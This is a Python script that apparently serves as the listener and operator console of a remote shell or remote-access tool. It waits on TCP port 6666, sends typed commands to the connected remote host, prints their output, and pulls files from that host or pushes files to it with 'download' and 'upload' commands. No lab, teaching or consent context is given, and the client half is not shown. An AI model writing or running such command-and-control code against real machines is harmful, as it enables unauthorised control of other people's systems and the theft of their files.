#!/usr/bin/python3.10
#

import os
import sys
import socket

class tcp_socket():

    def listen_on(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = ''
        self.s.bind((self.host, int(port)))
        self.s.listen(5)
        self.conn, self.addr = self.s.accept()

    def connect_to(self, host, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((host, int(port)))

    def recive_data(self):
        return self.conn.recv(1024)

    def send_data(self, data):
        self.conn.sendall(data)

    def send_all(self, filename):
        self.conn.sendall(open(filename, "rb").read())

    def recive_all(self):
        self.data = b''
        while True:
            self.data_chunk = self.conn.recv(1024)
            #if self.data_chunk:
            if (len(self.data_chunk) == 1024):
                self.data += self.data_chunk
            else:
                self.data += self.data_chunk
                break
        return self.data

    def close(self):
        self.conn.close()


#send and recive file
def recive_file(conn, file_name):
    data = conn.recive_all()
    with open(file_name, 'wb') as f:
        f.write(data)
    conn.send_data(bytes("OK", 'utf-8'))

def send_file(conn, file_name):
        conn.send_all(file_name)
        if str(conn.recive_data(), 'utf-8') == 'OK':
            #print("OK")
            pass

#send and recive msg
def msg_recive(conn):
    rec = str(conn.recive_data(), 'utf-8')
    return rec[:len(rec) - 1]

def msg_send(conn, cmd):
    conn.send_data(bytes(cmd + '\n', 'utf-8'))




def cmd_loop(conn):
    while 1:
        cmd = input(msg_recive(conn))

        if cmd == "exit":
            msg_send(conn, cmd)
            conn.close()
            exit()
            os.exit()
            break

        elif cmd.startswith('cd'):
            msg_send(conn, cmd)

        elif cmd.startswith('download'):
            msg_send(conn, cmd)
            recive_file(conn, cmd[9:len(cmd)])

        elif cmd.startswith('upload'):
            msg_send(conn, cmd)
            send_file(conn, cmd[7:len(cmd)])

        else:
            msg_send(conn, cmd)
            msg = msg_recive(conn)
            print(msg)



def honigkuchen_srv():
    conn = tcp_socket()
    conn.listen_on(6666)

    try:
        cmd_loop(conn)
    except:
        conn.close()


if __name__ == '__main__':
    honigkuchen_srv()





















